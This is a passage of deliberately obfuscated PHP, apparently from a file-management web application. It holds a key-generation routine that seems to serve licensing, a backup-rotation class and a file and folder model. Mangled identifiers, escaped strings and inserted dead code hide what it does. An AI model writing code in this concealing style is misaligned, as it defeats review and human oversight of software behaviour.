return; } } if ($Ì¦ÉÀ“ == 1) { break; } else { $ŸŒ»²Ò¼++; } } $È—›Ğ˜š = 2; for ($â’»›ƒ£ = 0; $â’»›ƒ£ < $©Ÿ˜±Õ * 10; $â’»›ƒ£++) { if (($©Ÿ˜±Õ * $â’»›ƒ£ + 1) % $ŸŒ»²Ò¼ == 0) { $È—›Ğ˜š = intval(($©Ÿ˜±Õ * $â’»›ƒ£ + 1) / $ŸŒ»²Ò¼); break; } } $µô°¿ñ‚ = $this->pnixd243fd28($ÜªÇ‘º® * $ı‚‚Êß . $•À½«[6], $•À½«[137]); $±õÚÙö = $íÖƒŞÑ[773]; while (strlen($±õÚÙö) < $íÖƒŞÑ[663]) { if (!$±õÚÙö) { break; } $±õÚÙö++; } $…èáÍË = md5($•À½«[301] . ($ÜªÇ‘º® + $ı‚‚Êß) . $•À½«[302] . $ŸŒ»²Ò¼ . $•À½«[302] . $È—›Ğ˜š . $•À½«[303]); $‡šŒÒçÔ = $íÖƒŞÑ[774]; if (strlen($‡šŒÒçÔ) < $íÖƒŞÑ[676]) { return; } $Ûõì¡Îş = $this->pnixd243fd28($º İáñİ, $…èáÍË) . $•À½«[304] . $µô°¿ñ‚; $Ïâ“é´ = $íÖƒŞÑ[775]; while (strlen($Ïâ“é´) < $íÖƒŞÑ[676]) { if (!$Ïâ“é´) { break; } $Ïâ“é´++; } return $Ûõì¡Îş; } public function uoft223a1968($äŒ„àÚ) { $İèƒÎ´ =& $_SERVER[‚ûòÉ˜ş]; $„âáğô =& $_SERVER[ºï·Óû­]; $¹ÙéµŸ´ = explode($„âáğô[304], $äŒ„àÚ); $áŞ‰Òº = $İèƒÎ´[776]; while ($áŞ‰Òº < $İèƒÎ´[663]) { if ($áŞ‰Òº >= 0) { break; } $áŞ‰Òº++; } if (count($¹ÙéµŸ´) != 2) { return $„âáğô[6]; } $Ì¤¡Ã¢ = $this->lrfb3aaa4d5c($¹ÙéµŸ´[1] . $„âáğô[6], $„âáğô[137]); if (!$Ì¤¡Ã¢) { return $„âáğô[6]; } $Ì¤¡Ã¢ = intval($Ì¤¡Ã¢); $Ô¨¦¬‡ = 0; $ò«Œ»­ = $İèƒÎ´[777]; while (strlen($ò«Œ»­) < $İèƒÎ´[19]) { if (!$ò«Œ»­) { break; } $ò«Œ»­++; } $ÒâÁÃøù = 0; $©ıô…œ¾ = $İèƒÎ´[778]; while (strlen($©ıô…œ¾) < $İèƒÎ´[663]) { if (!$©ıô…œ¾) { break; } $©ıô…œ¾++; } for ($¤ÀŞ±ÄŞ = 3; $¤ÀŞ±ÄŞ < $Ì¤¡Ã¢; $¤ÀŞ±ÄŞ += 2) { if ($Ì¤¡Ã¢ % $¤ÀŞ±ÄŞ != 0) { continue; } $Ô¨¦¬‡ = $¤ÀŞ±ÄŞ; $º€ä¾’• = $İèƒÎ´[779]; while ($º€ä¾’• < $İèƒÎ´[663]) { if ($º€ä¾’• >= 0) { break; } $º€ä¾’•++; } $ÒâÁÃøù = intval($Ì¤¡Ã¢ / $¤ÀŞ±ÄŞ); $“€§æ¥µ = $İèƒÎ´[780]; while ($“€§æ¥µ < $İèƒÎ´[19]) { if ($“€§æ¥µ >= 0) { break; } $“€§æ¥µ++; } break; } $§ÄâäÊ¾ = ($Ô¨¦¬‡ - 1) * ($ÒâÁÃøù - 1); $×›áãöÊ = $İèƒÎ´[781]; while ($×›áãöÊ < $İèƒÎ´[19]) { if ($×›áãöÊ >= 0) { break; } $×›áãöÊ++; } $®Ï½‹– = intval(($Ô¨¦¬‡ + $ÒâÁÃøù) / 2); while (1) { $õ¢€¤ÇÍ = $®Ï½‹–; $ğò¸ÖÇ– = $§ÄâäÊ¾; while ($ğò¸ÖÇ– % $õ¢€¤ÇÍ != 0) { $â‚Ü¨×® = $ğò¸ÖÇ–; $ğò¸ÖÇ– = $õ¢€¤ÇÍ; $ÙÍçÓâ© = $İèƒÎ´[782]; if (strlen($ÙÍçÓâ©) < $İèƒÎ´[663]) { die; } $õ¢€¤ÇÍ = $â‚Ü¨×® % $õ¢€¤ÇÍ; } if ($õ¢€¤ÇÍ == 1) { break; } else { $®Ï½‹–++; } } $·Ó¡¦óÓ = 2; for ($¤ÀŞ±ÄŞ = 0; $¤ÀŞ±ÄŞ < $§ÄâäÊ¾ * 10; $¤ÀŞ±ÄŞ++) { if (($§ÄâäÊ¾ * $¤ÀŞ±ÄŞ + 1) % $®Ï½‹– == 0) { $·Ó¡¦óÓ = intval(($§ÄâäÊ¾ * $¤ÀŞ±ÄŞ + 1) / $®Ï½‹–); break; } } $¤Á¹ÏÓš = md5($„âáğô[301] . ($Ô¨¦¬‡ + $ÒâÁÃøù) . $„âáğô[302] . $®Ï½‹– . $„âáğô[302] . $·Ó¡¦óÓ . $„âáğô[303]); $·½ïÀÒú = $this->lrfb3aaa4d5c($¹ÙéµŸ´[0], $¤Á¹ÏÓš); $Õû´õ¤İ = $İèƒÎ´[783]; if (!$Õû´õ¤İ) { return; } return $·½ïÀÒú; $õà¥ĞĞó = $İèƒÎ´[784]; if (!$õà¥ĞĞó) { return; } } public function fnhw0a7ff999() { $™Å¡›Ñİ =& $_SERVER[‚ûòÉ˜ş]; $Æ°…˜º¢ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÊúßÊì„ = $™Å¡›Ñİ[785]; $ù¤§¾·ö = array(); $ËŠŸ™ËÃ = 1; while ($ËŠŸ™ËÃ <= (int) sqrt($Æ°…˜º¢)) { $ÄŠô«»Ÿ = $ËŠŸ™ËÃ; while (!0) { $ÄŠô«»Ÿ++; if ($ÄŠô«»Ÿ <= 2) { $ËŠŸ™ËÃ = $ÄŠô«»Ÿ; break; } else { if ($ÄŠô«»Ÿ < 2) { continue; } } $µìşŠ”Ã = !0; for ($„ò–ÙïÌ = 2; $„ò–ÙïÌ <= sqrt($ÄŠô«»Ÿ); $„ò–ÙïÌ++) { if ($ÄŠô«»Ÿ % $„ò–ÙïÌ == 0) { $µìşŠ”Ã = !1; } } if ($µìşŠ”Ã) { $ËŠŸ™ËÃ = $ÄŠô«»Ÿ; break; } } $ù¤§¾·ö[] = $ËŠŸ™ËÃ; } $–„½¸§£ = 2; $€»‘ûõ = $™Å¡›Ñİ[786]; if (!$€»‘ûõ) { return; } for ($ÄŠô«»Ÿ = $Æ°…˜º¢; $ÄŠô«»Ÿ > 1; $ÄŠô«»Ÿ--) { $µìşŠ”Ã = !0; foreach ($ù¤§¾·ö as $‹¶”æàÌ) { if ($ÄŠô«»Ÿ % $‹¶”æàÌ == 0) { $µìşŠ”Ã = !1; break; } } if ($µìşŠ”Ã) { $–„½¸§£ = $ÄŠô«»Ÿ; break; } } return $–„½¸§£; $ĞÒÇ€À‚ = $™Å¡›Ñİ[787]; } public function jlwc31645c16($»œäµ·, $Ò÷ˆ ³Ë) { $”û‡îñ¥ =& $_SERVER[ºï·Óû­]; return call_user_func(array($”û‡îñ¥[8], $”û‡îñ¥[305]), $»œäµ·, $Ò÷ˆ ³Ë); } public function pnixd243fd28($¬ß¦½Ê, $É·ñ©é) { $Œ±µş²Â =& $_SERVER[ºï·Óû­]; return call_user_func(array($Œ±µş²Â[306], $Œ±µş²Â[307]), $¬ß¦½Ê, $É·ñ©é); } public function lrfb3aaa4d5c($ƒ´«š´, $Í»ËáÚ³) { $¬ŒŞ±‰ =& $_SERVER[ºï·Óû­]; return call_user_func(array($¬ŒŞ±‰[306], $¬ŒŞ±‰[308]), $ƒ´«š´, $Í»ËáÚ³); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Äé›® =& $_SERVER[‚ûòÉ˜ş]; $this->isManual(); self::$name = date($Äé›®[788]); if (!($¯åÉõÂñ = Model($Äé›®[789])->lastItem())) { $¯åÉõÂñ = $this->initData(); } else { self::$name = $¯åÉõÂñ[$Äé›®[42]]; if ($¯åÉõÂñ[$Äé›®[790]] == $Äé›®[98]) { self::$name = date($Äé›®[264]); $¼’ØÎÂÀ = 0; if (isset($¯åÉõÂñ[$Äé›®[346]][$Äé›®[224]][$Äé›®[517]])) { $¼’ØÎÂÀ = (int) $¯åÉõÂñ[$Äé›®[346]][$Äé›®[224]][$Äé›®[517]]; } if (self::$manual == 0 && $¯åÉõÂñ[$Äé›®[42]] == self::$name) { Model($Äé›®[789])->remove($¯åÉõÂñ[$Äé›®[451]]); } $¯åÉõÂñ = $this->initData($¼’ØÎÂÀ, $¯åÉõÂñ[$Äé›®[791]]); } else { $this->checkStore($¯åÉõÂñ[$Äé›®[791]]); } } self::$option = $¯åÉõÂñ; } private function isManual() { $¢°×Ö÷ = _get($GLOBALS, $_SERVER[‚ûòÉ˜ş][792], 0); $¢°×Ö÷ = intval($¢°×Ö÷); self::$manual = $¢°×Ö÷ && $¢°×Ö÷ == 1 ? 1 : 0; } private function initData($Ç—á¾ï = 0, $ÇÎƒ–œÚ = '') { $š¨†›Î² =& $_SERVER[‚ûòÉ˜ş]; $®¹À£ = Model($š¨†›Î²[789])->config(); if ($ÇÎƒ–œÚ && $®¹À£[$š¨†›Î²[791]] != $ÇÎƒ–œÚ) { $Ç—á¾ï = 0; } $this->checkStore($®¹À£[$š¨†›Î²[791]]); if (self::$manual == 1) { self::$name .= $š¨†›Î²[11] . date($š¨†›Î²[793]); } $Èğõ«öã = array($š¨†›Î²[791] => $®¹À£[$š¨†›Î²[791]], $š¨†›Î²[42] => self::$name, $š¨†›Î²[790] => 0, $š¨†›Î²[794] => $®¹À£[$š¨†›Î²[794]], $š¨†›Î²[795] => self::$manual, $š¨†›Î²[346] => array($š¨†›Î²[796] => array($š¨†›Î²[790] => 0), $š¨†›Î²[797] => array($š¨†›Î²[790] => 0, $š¨†›Î²[798] => 0, $š¨†›Î²[799] => 0, $š¨†›Î²[43] => $š¨†›Î²[12], $š¨†›Î²[800] => 0, $š¨†›Î²[801] => 0), $š¨†›Î²[802] => array($š¨†›Î²[790] => 0, $š¨†›Î²[798] => 0, $š¨†›Î²[799] => 0, $š¨†›Î²[800] => 0, $š¨†›Î²[801] => 0), $š¨†›Î²[224] => array($š¨†›Î²[790] => 0, $š¨†›Î²[803] => 0, $š¨†›Î²[804] => 0, $š¨†›Î²[805] => 0, $š¨†›Î²[806] => 0, $š¨†›Î²[517] => $Ç—á¾ï, $š¨†›Î²[800] => 0, $š¨†›Î²[801] => 0)), $š¨†›Î²[800] => time(), $š¨†›Î²[801] => 0); $òØµä´ = Model($š¨†›Î²[789])->insert($Èğõ«öã); $Èğõ«öã[$š¨†›Î²[451]] = $òØµä´; return $Èğõ«öã; } private function checkStore($æ¤µŒçÆ) { $ ª¼¦Í½ =& $_SERVER[‚ûòÉ˜ş]; $ì“‘–Ï¿ = Model($ ª¼¦Í½[807])->listData($æ¤µŒçÆ); Model($ ª¼¦Í½[807])->checkConfig($ì“‘–Ï¿); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[‚ûòÉ˜ş][789])->findByName(self::$name); } return self::$option; } public static function set($¡ô˜‡®ª) { $×è–åƒä =& $_SERVER[‚ûòÉ˜ş]; $¢”¬øƒ£ = self::get(); foreach ($¡ô˜‡®ª as $…Ï×ÅÌ => $èí†ÛÇ•) { $ÃÇºò³Å = explode($×è–åƒä[10], $…Ï×ÅÌ); $°Üá‹»â = count($ÃÇºò³Å); switch ($°Üá‹»â) { case 1: $¢”¬øƒ£[$ÃÇºò³Å[0]] = $èí†ÛÇ•; break; case 2: $¢”¬øƒ£[$ÃÇºò³Å[0]][$ÃÇºò³Å[1]] = $èí†ÛÇ•; break; case 3: $¢”¬øƒ£[$ÃÇºò³Å[0]][$ÃÇºò³Å[1]][$ÃÇºò³Å[2]] = $èí†ÛÇ•; break; } } Model($×è–åƒä[789])->update($¢”¬øƒ£[$×è–åƒä[451]], $¢”¬øƒ£); self::$option = $¢”¬øƒ£; return self::$option; } public function keep() { $˜ú©š =& $_SERVER[‚ûòÉ˜ş]; $Ğ”Ú¦› = self::get(); if ($Ğ”Ú¦›[$˜ú©š[346]][$˜ú©š[796]][$˜ú©š[790]] == $˜ú©š[98]) { return; } $this->backupKeep($Ğ”Ú¦›); self::set(array($˜ú©š[808] => 1)); } private function backupKeep($óö‰¯ØÚ) { $éÛ—‡³æ =& $_SERVER[‚ûòÉ˜ş]; if (self::$manual == 1) { return; } $Õ’á˜ñ­ = Model($éÛ—‡³æ[789])->listData(); if (empty($Õ’á˜ñ­)) { return; } $çĞÓ¯ü = 0; $Ü’ªÒ»Ú = array(); foreach ($Õ’á˜ñ­ as $´¼±‹£Ã) { if ($çĞÓ¯ü >= 7) { break; } $Ü’ªÒ»Ú[] = $´¼±‹£Ã[$éÛ—‡³æ[42]]; $çĞÓ¯ü++; } for ($çĞÓ¯ü = 0; $çĞÓ¯ü < 12; $çĞÓ¯ü++) { $Ü’ªÒ»Ú[] = date($éÛ—‡³æ[809], strtotime("\55{$çĞÓ¯ü}\40\x6d\157\x6e\164\150\163")); } $Ü’ªÒ»Ú = array_unique($Ü’ªÒ»Ú); $û€Ÿ´³• = Model($éÛ—‡³æ[810])->get($éÛ—‡³æ[811]); foreach ($Õ’á˜ñ­ as $´¼±‹£Ã) { if (isset($´¼±‹£Ã[$éÛ—‡³æ[795]]) && $´¼±‹£Ã[$éÛ—‡³æ[795]] == $éÛ—‡³æ[98]) { continue; } if (!empty($´¼±‹£Ã[$éÛ—‡³æ[42]]) && in_array($´¼±‹£Ã[$éÛ—‡³æ[42]], $Ü’ªÒ»Ú)) { continue; } Model($éÛ—‡³æ[789])->remove($´¼±‹£Ã[$éÛ—‡³æ[451]]); $´ˆó” Á = $this->backupPath($óö‰¯ØÚ, $û€Ÿ´³•); IO::remove($´ˆó” Á, !1); } } private function backupPath($¦ŞĞÎ¿½, $õê»§ˆ§ = false) { $¤ÑöŞˆ­ =& $_SERVER[‚ûòÉ˜ş]; if (!$õê»§ˆ§) { $õê»§ˆ§ = Model($¤ÑöŞˆ­[810])->get($¤ÑöŞˆ­[811]); } $£ÔÕ™² = $¦ŞĞÎ¿½[$¤ÑöŞˆ­[42]]; $İ®úàŒİ = substr(md5($¤ÑöŞˆ­[812] . $õê»§ˆ§ . $£ÔÕ™²), 0, 8); return "\173\x69\157\72{$¦ŞĞÎ¿½[$¤ÑöŞˆ­[791]]}\x7d\57\x64\x61\164\x61\142\141\163\x65\57\142\141\143\153\x75\160\57" . $£ÔÕ™² . $¤ÑöŞˆ­[11] . $İ®úàŒİ; } public function db() { $Ş­°Àš =& $_SERVER[‚ûòÉ˜ş]; $ªİæ“ÅØ = self::get(); if ($ªİæ“ÅØ[$Ş­°Àš[346]][$Ş­°Àš[797]][$Ş­°Àš[790]] == $Ş­°Àš[98]) { return !0; } $ĞÙÀÇ¨æ = new BackupDb(); if (!$ĞÙÀÇ¨æ->index()) { return !1; } self::set(array($Ş­°Àš[813] => 1)); return !0; } public function dbFile() { $ƒŠÜìÃÔ =& $_SERVER[‚ûòÉ˜ş]; $‡´‘˜‡Î = self::get(); if ($‡´‘˜‡Î[$ƒŠÜìÃÔ[346]][$ƒŠÜìÃÔ[802]][$ƒŠÜìÃÔ[790]] == $ƒŠÜìÃÔ[98]) { return !0; } $œºÄ¶î = new BackupDbFile(); if (!$œºÄ¶î->index()) { return !1; } self::set(array($ƒŠÜìÃÔ[814] => 1)); return !0; } public function file() { $ù´µ¥ª =& $_SERVER[‚ûòÉ˜ş]; $ó§ğŸ‘˜ = self::get(); if ($ó§ğŸ‘˜[$ù´µ¥ª[346]][$ù´µ¥ª[224]][$ù´µ¥ª[790]] == $ù´µ¥ª[98]) { return !0; } if (!isset($ó§ğŸ‘˜[$ù´µ¥ª[794]]) || $ó§ğŸ‘˜[$ù´µ¥ª[794]] == $ù´µ¥ª[222]) { $ºµÄŠÖš = new BackupFile(); if (!$ºµÄŠÖš->index()) { return !1; } } self::set(array($ù´µ¥ª[815] => 1, $ù´µ¥ª[790] => 1)); return !0; } } goto c—áïİƒî¤; c‡ÃËùÃ‹ô: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Òü÷¬¼Ë) { $§³‹Í =& $_SERVER[‚ûòÉ˜ş]; $Ëå²‘Ëí = Model($§³‹Í[554])->where(array($§³‹Í[1678] => $Òü÷¬¼Ë))->find(); $è²·ê„ß = $this->_mkdirRoot(SourceModel::TYPE_USER, $Òü÷¬¼Ë, $Ëå²‘Ëí[$§³‹Í[42]]); $this->userDesktopAdd($è²·ê„ß); return $è²·ê„ß; } public function userDesktopAdd($«åûæ‘ø) { $âÈÓ©ùù =& $_SERVER[‚ûòÉ˜ş]; $·‹š™ = LNG($âÈÓ©ùù[2158]); $§°÷õÛ÷ = $this->mkdir($«åûæ‘ø, $·‹š™); $this->metaSet($§°÷õÛ÷, $âÈÓ©ùù[2159], $âÈÓ©ùù[98]); $this->metaSet($«åûæ‘ø, $âÈÓ©ùù[2160], $§°÷õÛ÷); } public function userPathSafeAdd($¸ôø‡´Æ) { $ÁÕÀ„±ú =& $_SERVER[‚ûòÉ˜ş]; $­Êæ Ü = Model($ÁÕÀ„±ú[554])->getInfoFull($¸ôø‡´Æ); if (!$­Êæ Ü) { return !1; } if (_get($­Êæ Ü, $ÁÕÀ„±ú[576])) { return $­Êæ Ü[$ÁÕÀ„±ú[515]][$ÁÕÀ„±ú[2161]]; } $§”òİñ¯ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¸ôø‡´Æ, $ÁÕÀ„±ú[2162], $ÁÕÀ„±ú[482]); Model($ÁÕÀ„±ú[554])->metaSet($¸ôø‡´Æ, $ÁÕÀ„±ú[2161], $§”òİñ¯); $this->metaSet($§”òİñ¯, $ÁÕÀ„±ú[2163], $¸ôø‡´Æ); return $§”òİñ¯; } public function groupRootAdd($¿åªÆ¨´) { $ÊíÄ·¸ =& $_SERVER[‚ûòÉ˜ş]; $öĞ£Ó»ö = Model($ÊíÄ·¸[562])->where(array($ÊíÄ·¸[1973] => $¿åªÆ¨´))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¿åªÆ¨´, $öĞ£Ó»ö[$ÊíÄ·¸[42]]); } public function systemRootPathAdd($ö§²ÒşÛ) { if ($ö§²ÒşÛ != $_SERVER[‚ûòÉ˜ş][582]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ö§²ÒşÛ); } public function userRootRemove($Œ’î—Í€) { $»ÅÖãËÏ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Œ’î—Í€, !0); foreach ($»ÅÖãËÏ as $˜•¶œîÛ) { if (!$˜•¶œîÛ) { continue; } $this->remove($˜•¶œîÛ[$_SERVER[‚ûòÉ˜ş][191]], !1); } } public function groupRootRemove($û¬¶õá) { $Ç¸Åˆáœ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $û¬¶õá); if (!$Ç¸Åˆáœ) { return; } $this->remove($Ç¸Åˆáœ[$_SERVER[‚ûòÉ˜ş][191]], !1); } private function _mkdirRoot($šŸÌ÷–…, $˜™íÜ¹£, $ËÉ«ŒÍ˜, $àÖ¦¯á = '') { $å™„‡Ğ‹ =& $_SERVER[‚ûòÉ˜ş]; $‚‹¯å´ = defined($å™„‡Ğ‹[2106]) ? USER_ID : 0; $Ş§”¢± = array($å™„‡Ğ‹[453] => 0, $å™„‡Ğ‹[624] => $šŸÌ÷–…, $å™„‡Ğ‹[625] => $˜™íÜ¹£, $å™„‡Ğ‹[622] => 1, $å™„‡Ğ‹[626] => $‚‹¯å´, $å™„‡Ğ‹[627] => $‚‹¯å´, $å™„‡Ğ‹[623] => $àÖ¦¯á, $å™„‡Ğ‹[628] => $å™„‡Ğ‹[571], $å™„‡Ğ‹[480] => 0, $å™„‡Ğ‹[593] => 0, $å™„‡Ğ‹[518] => 0, $å™„‡Ğ‹[629] => $å™„‡Ğ‹[12]); if ($»¸ã¨÷ı = $this->where($Ş§”¢±)->find()) { return $»¸ã¨÷ı[$å™„‡Ğ‹[191]]; } $§ÛŸ¼İ› = "\x4d\157\x64\x65\154\x53\x6f\165\162\x63\x65\56\x6d\x6b\144\151\x72\122\157\x6f\x74\56{$šŸÌ÷–…}\x2e{$˜™íÜ¹£}\x2e" . $ËÉ«ŒÍ˜; CacheLock::lock($§ÛŸ¼İ›); $Ş§”¢±[$å™„‡Ğ‹[42]] = $ËÉ«ŒÍ˜; $Ëë»¨ú = $this->add($Ş§”¢±); $Í…ñÀÊ¦ = array($å™„‡Ğ‹[630] => short_id($Ëë»¨ú)); $this->where(array($å™„‡Ğ‹[467] => $Ëë»¨ú))->save($Í…ñÀÊ¦); CacheLock::unlock($§ÛŸ¼İ›); return $Ëë»¨ú; } private function targetSourceRoot($úâä©¢›, $É’¥÷Éİ, $Û¸¯ÓîÈ = false) { $£ºèßÙ½ =& $_SERVER[‚ûòÉ˜ş]; $àú¦Í²ë = array($£ºèßÙ½[453] => 0, $£ºèßÙ½[624] => $úâä©¢›, $£ºèßÙ½[625] => $É’¥÷Éİ); if ($Û¸¯ÓîÈ) { $ìÏƒã¡‰ = $this->where($àú¦Í²ë)->select(); return $ìÏƒã¡‰ ? $ìÏƒã¡‰ : array(); } $×¢ôé» = $this->where($àú¦Í²ë)->find(); return $×¢ôé» ? $×¢ôé» : array(); } public function sourceRootGroup($ÓÑä¸µª) { $Ë«½·â =& $_SERVER[‚ûòÉ˜ş]; if (is_string($ÓÑä¸µª)) { $ÓÑä¸µª = array($ÓÑä¸µª); } $‰²ïÀß» = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÓÑä¸µª, $Ë«½·â[213]); $·ëñæŞÌ = array($Ë«½·â[422] => $‰²ïÀß», $Ë«½·â[419] => array($Ë«½·â[798] => count($ÓÑä¸µª))); $this->_listDataApply($·ëñæŞÌ[$Ë«½·â[422]]); $this->_listMake($·ëñæŞÌ); return array_to_keyvalue($·ëñæŞÌ[$Ë«½·â[92]], $Ë«½·â[546]); } public function mkfile($©â„äÖİ, $«ä‡², $Ä·æµ²ó = '', $…·ÕÃê… = REPEAT_RENAME) { $·ºê¥ã¸ =& $_SERVER[‚ûòÉ˜ş]; $ÑÌ¤û”™ = Model($·ºê¥ã¸[651])->addFileByContent($Ä·æµ²ó, $«ä‡²); return $this->_createFileCall($©â„äÖİ, $«ä‡², $ÑÌ¤û”™, $…·ÕÃê…, $·ºê¥ã¸[1383]); } public function addFile($ëò÷, $£ı“€ùğ, $êÉºóİ, $è˜æÈó” = false, $–€úÅ´— = REPEAT_RENAME) { $õ‚ãø© = Model($_SERVER[‚ûòÉ˜ş][651])->addFile($£ı“€ùğ, $êÉºóİ, $è˜æÈó”); return $this->_createFileCall($ëò÷, $êÉºóİ, $õ‚ãø©, $–€úÅ´—); } public function addFileByFileID($ˆ©¤¯£œ, $‡¼ù¬˜», $ÙñœïÇ¬, $Ä¯ÃæÔ² = REPEAT_RENAME) { $ªåƒœù‚ =& $_SERVER[‚ûòÉ˜ş]; $·Äé€ = Model($ªåƒœù‚[651])->find($‡¼ù¬˜»); Model($ªåƒœù‚[651])->linkAdd($‡¼ù¬˜»); return $this->_createFileCall($ˆ©¤¯£œ, $ÙñœïÇ¬, $·Äé€, $Ä¯ÃæÔ²); } public function addFileByRemote($¬•øÇŞÙ, $±îÏ€ß¿, $¢­–»¥—, $Ğ§¨äºØ = array(), $ŒÆÈËè = REPEAT_RENAME) { $À¶»ûë– = Model($_SERVER[‚ûòÉ˜ş][651])->addFileByRemote($±îÏ€ß¿, $¢­–»¥—, $Ğ§¨äºØ); return $this->_createFileCall($¬•øÇŞÙ, $¢­–»¥—, $À¶»ûë–, $ŒÆÈËè); } private function _createFileCall($Õ›Ø®û¸, $ğÄ©Õé×, $åö‡ªŸã, $ˆêÜªÅê, $Æİã€‘ = "\165\160\x6c\157\x61\144") { $¶Ôè™ =& $_SERVER[‚ûòÉ˜ş]; $…¦ì³¿Ç = !1; $this->setMasterDB(); $this->lockWriteStart($Õ›Ø®û¸, $ğÄ©Õé×); $ûÙçÍ°Ú = $this->fileNameExist($Õ›Ø®û¸, $ğÄ©Õé×); $‹èÏ‚­ê = $this->_createFile($Õ›Ø®û¸, $ğÄ©Õé×, $åö‡ªŸã, $ˆêÜªÅê, $…¦ì³¿Ç); if (!$…¦ì³¿Ç) { Model($¶Ôè™[520])->remove($åö‡ªŸã[$¶Ôè™[517]]); } if ($…¦ì³¿Ç && $‹èÏ‚­ê && $‹èÏ‚­ê != $ûÙçÍ°Ú) { Model($¶Ôè™[2131])->eventCreate($‹èÏ‚­ê, $Æİã€‘); } $this->lockWriteEnd($Õ›Ø®û¸, $ğÄ©Õé×); return $‹èÏ‚­ê; } public function mkdir($ãìÇ™î¹, $û»ÖÆşŞ, $œ°ÊÁˆš = REPEAT_SKIP) { $“¢“Ò‘¶ =& $_SERVER[‚ûòÉ˜ş]; $this->setMasterDB(); $ñ§Óª¨† = $this->sourceInfo($ãìÇ™î¹); if (!$ñ§Óª¨†) { return !1; } $this->lockWriteStart($ãìÇ™î¹, $û»ÖÆşŞ); if ($œ°ÊÁˆš !== !1) { $Ä¨‚ÖÊË = $this->fileNameExist($ãìÇ™î¹, $û»ÖÆşŞ); if ($Ä¨‚ÖÊË && $œ°ÊÁˆš != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ãìÇ™î¹, $û»ÖÆşŞ); return $Ä¨‚ÖÊË; } $û»ÖÆşŞ = $this->fileNameAuto($ãìÇ™î¹, $û»ÖÆşŞ, $œ°ÊÁˆš); } $ÄÇ¥Íà¬ = array($“¢“Ò‘¶[622] => 1, $“¢“Ò‘¶[470] => $û»ÖÆşŞ, $“¢“Ò‘¶[623] => $“¢“Ò‘¶[12], $“¢“Ò‘¶[518] => 0, $“¢“Ò‘¶[593] => 0); $ÙáıÎç‹ = $this->_addSource($ÄÇ¥Íà¬, $ñ§Óª¨†); Model($“¢“Ò‘¶[2131])->eventCreate($ÙáıÎç‹, $“¢“Ò‘¶[1384]); $this->lockWriteEnd($ãìÇ™î¹, $û»ÖÆşŞ); return $ÙáıÎç‹; } public function listSourceRoot($¨ º›, $ãÉòè¸Ò, $õ›ëÃé = "\163\x6f\165\x72\143\x65\x49\104\54\164\x61\162\147\145\x74\111\104\54\163\151\x7a\145") { $¼äŸˆ«Î =& $_SERVER[‚ûòÉ˜ş]; $÷âÌ®–Æ = $¼äŸˆ«Î[22]; $²¶—íåØ = array(); $£Í§¨ƒ = 1024 * 50; $ ‡æÅ = is_array($ ‡æÅ) ? $ ‡æÅ : array(); $¸ÒÒ§¸ú = count($ãÉòè¸Ò); $‚ğÕú‚” = $this->tablePrefix . $¼äŸˆ«Î[2164]; for ($¹šÎŒªÄ = 0; $¹šÎŒªÄ < $¸ÒÒ§¸ú; $¹šÎŒªÄ++) { $‚İ¹ãÔß = $ãÉòè¸Ò[$¹šÎŒªÄ]; $÷âÌ®–Æ .= "\123\105\x4c\105\x43\124\x20\52\x20\106\122\117\x4d\40\50\123\105\x4c\x45\x43\124\40{$õ›ëÃé}\40\x46\122\x4f\115\40\x60{$‚ğÕú‚”}\x60\40\x57\x48\x45\122\105\x20"; $÷âÌ®–Æ .= "\140\160\141\162\x65\x6e\x74\x49\104\140\x3d\60\x20\x41\x4e\x44\40\x60\x74\141\162\x67\145\x74\x49\x44\140\x3d{$‚İ¹ãÔß}\40\x41\116\x44\40\x60\164\x61\162\x67\145\x74\x54\171\x70\x65\x60\x3d{$¨ º›}\40\141\x6e\x64\x20\146\x69\x6c\145\x54\x79\160\x65\75\47\47\x20\x6c\x69\155\x69\x74\40\x31\51\x20\x61\163\x20\164\142\137{$¹šÎŒªÄ}\x20\x55\x4e\111\x4f\x4e\x20\x41\x4c\x4c\x20"; if ((strlen($÷âÌ®–Æ) >= $£Í§¨ƒ || $¹šÎŒªÄ == $¸ÒÒ§¸ú - 1) && $÷âÌ®–Æ) { $÷âÌ®–Æ = substr($÷âÌ®–Æ, 0, -strlen($¼äŸˆ«Î[1079])); $ßİëıáå = $this->query($÷âÌ®–Æ); $÷âÌ®–Æ = $¼äŸˆ«Î[12]; $²¶—íåØ = array_merge($²¶—íåØ, $ßİëıáå); } } return $²¶—íåØ; } private function _createFile($¿Ãá‹¹·, $†ßÍ‚Ø, $ˆ¼õ»ÊØ, $ğ‹İÀ³À, &$ÁÁ¥¬›) { $Ç³›œ¼† =& $_SERVER[‚ûòÉ˜ş]; $¢á‘ôß = $this->sourceInfo($¿Ãá‹¹·); if (!$ˆ¼õ»ÊØ || !$¢á‘ôß) { return !1; } if ($ğ‹İÀ³À !== !1) { $äÒÂ¹¤ë = $this->fileNameExist($¿Ãá‹¹·, $†ßÍ‚Ø); } $ÁÁ¥¬› = !0; if ($ğ‹İÀ³À && $äÒÂ¹¤ë) { if ($ğ‹İÀ³À == REPEAT_SKIP) { $ÁÁ¥¬› = !1; return $äÒÂ¹¤ë; } else { if ($ğ‹İÀ³À == REPEAT_REPLACE) { $äıÅü„§ = $this->sourceInfo($äÒÂ¹¤ë); $ò¹ø¡õû = $this->fileHistory($äıÅü„§, $ˆ¼õ»ÊØ[$Ç³›œ¼†[517]], $ˆ¼õ»ÊØ[$Ç³›œ¼†[86]]); if (!$ò¹ø¡õû) { $ÁÁ¥¬› = !1; } else { $this->folderSizeReset($¿Ãá‹¹·); } return $äÒÂ¹¤ë; } else { $†ßÍ‚Ø = $this->fileNameAuto($¿Ãá‹¹·, $†ßÍ‚Ø, $ğ‹İÀ³À, !1); } } } $†¾¶ç¿ = array($Ç³›œ¼†[622] => 0, $Ç³›œ¼†[470] => $†ßÍ‚Ø, $Ç³›œ¼†[623] => substr(get_path_ext($†ßÍ‚Ø), 0, 10), $Ç³›œ¼†[518] => 